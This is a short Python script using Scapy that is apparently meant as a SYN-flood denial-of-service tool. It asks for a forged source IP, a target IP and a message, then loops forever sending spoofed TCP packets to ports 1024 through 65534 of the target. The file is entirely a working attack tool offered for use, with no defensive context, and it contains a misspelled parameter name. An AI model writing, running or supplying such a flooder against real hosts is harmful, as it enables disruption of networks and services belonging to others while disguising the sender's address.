#!/usr/bin/python

from scapy.all import *
def synflood(src,tgt,messgae):
        for dport in range(1024,65535):
                IPlayer = IP(src=src,dst=tgt)
                TCPlayer = TCP(sport=4444,dport=dport)
                RAWlayer = Raw(load=message)
                pkt=IPlayer/TCPlayer/RAWlayer
                send(pkt)


source = input("[*] Enter Source IP Address to Fake : ")
target = input("[*] Enter Target IP Address : ")
message = input("[*] Enter message you want to send : ")


while True:
        synflood(source,target,message)
